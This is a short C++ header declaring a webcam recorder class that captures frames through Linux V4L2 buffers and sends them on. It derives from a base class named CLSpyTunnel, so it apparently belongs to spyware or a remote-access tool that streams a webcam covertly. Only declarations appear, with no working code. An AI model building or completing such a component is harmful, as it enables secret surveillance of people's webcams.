#ifndef CLWEBCAM_RECORDER_HPP
#define CLWEBCAM_RECORDER_HPP

#include <linux/videodev2.h>
#include <sys/mman.h>
#include "cltunnel_include.hpp"
#include "clspy_tunnel.hpp"

#define BUFFER_COUNT 3
#define FRAME_DELAY_US 100000

struct FrameBuffer {
    void* start_ = nullptr;
    size_t length_ = 0;
};

class CLWebcamRecorder : public CLSpyTunnel {
public:
    void run() override;
protected:
    uint32_t device_num_ = 0;
    int dev_fd_ = -1;
    FrameBuffer buffers_[BUFFER_COUNT];

    int webcam_init();
    int send_frame(unsigned int __index);
    void webcam_cleanup();
};
#endif // CLWEBCAM_RECORDER_HPP